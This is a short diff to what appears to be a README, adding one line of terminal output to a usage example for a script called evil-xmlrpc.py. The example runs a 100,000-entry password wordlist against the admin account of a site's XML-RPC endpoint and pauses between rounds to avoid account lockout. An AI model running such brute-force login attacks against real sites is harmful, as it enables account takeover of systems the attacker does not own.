@@ -69,4 +69,5 @@ root@user:~ python3 evil-xmlrpc.py 100000-pass-wordlist.txt admin https://www.ex
 [*] Password Not Cracked.
 
 [*] Waiting 5 mins to prevent lockout...
+[*] Till next requests: 3:24
 ```
